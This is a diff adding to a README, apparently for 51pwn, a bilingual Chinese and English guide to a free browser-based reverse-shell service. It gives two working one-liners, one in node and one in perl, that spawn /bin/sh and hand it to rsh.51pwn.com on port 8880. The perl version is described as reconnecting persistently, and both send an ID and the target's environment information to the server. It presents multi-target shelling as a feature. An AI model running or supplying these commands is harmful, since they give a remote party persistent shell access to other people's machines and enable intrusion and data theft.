@@ -1,3 +1,47 @@
+# 免费的 web reverse shell
+* 1 setYourId: xxxx_001 
+** 当然你可以设置只有你知道的字符串
+** 必须在 reverse shell 中输出给 server，便于关联
+** 新的特性： 可以若干个 目标同时 reverse shell 到 web浏览器
+
+* 2 start your reverse shell
+  *** 第一行发给 server，告诉server 你关联的id：xxxx_001
+  *** 第二行是一个json 数据，通常可以用来收集目标的环境信息，反馈给server
+  注意下面的命令当你输入 exit 则不会重新连接到服务器
+```
+node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(8880, "rsh.51pwn.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client);client.write("xxxx_001\n");client.write("{}\n") }); return /a/;})();'
+```
+  *** 特别推荐下面的命令，经过若干 AI 的优化，可以覆盖 90% 以上的服务器上正确运行, 下面的命令明显比上面的更加优化，即便你关闭浏览器，或者输入exit，下面的代码会自动重新上线
+```
+  perl -e 'use Socket;while (1) {socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(8880,inet_aton("rsh.51pwn.com")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");if (fork() == 0){exec("/bin/sh -i");};};};'
+```
+* open your browser
+  *** 注意后面的id必须和上面的一致
+https://51pwn.com/indexes/xterm.html?id=xxxx_001
+"""
+# Free web reverse shell
+* 1 setYourId: xxxx_001
+** Of course you can set a string that only you know
+** Must be output to the server in reverse shell to facilitate correlation
+** New feature: Several targets can be reverse shelled to the web browser at the same time
+
+* 2 start your reverse shell
+   *** The first line is sent to the server, telling the server your associated ID: xxxx_001
+   *** The second line is a json data, which can usually be used to collect target environment information and feed it back to the server.
+   Note that the following command will not reconnect to the server when you type exit
+```
+node -e '(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net .Socket(); client.connect(8880, "rsh.51pwn.com", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); client.write("xxxx_001\n");client.write("{}\n") }); return /a/;})();'
+```
+   *** The following command is particularly recommended. After several AI optimizations, it can cover more than 90% of servers and run correctly. The following command is obviously more optimized than the above. Even if you close the browser or enter exit, the following code will Automatically come back online
+```
+   perl -e 'use Socket;while (1) {socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(8880,inet_aton("rsh.51pwn.com"))) ){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");if (fork() == 0){exec("/bin/sh - i");};};};'
+```
+* open your browser
+   *** Note that the following id must be consistent with the above
+https://51pwn.com/indexes/xterm.html?id=xxxx_001
+"""
+
+
 # <a href=https://www.zhihu.com/question/614532345/answer/3139952074 target=_blank>哪里有免费的视频监控报警系统？</a>
 <a href="https://chat.51pwn.com:2083/?cnId=Change2YourHomeId&atRd=true&showme=true&eAi=true&startChat=1">https://chat.51pwn.com</a>
 
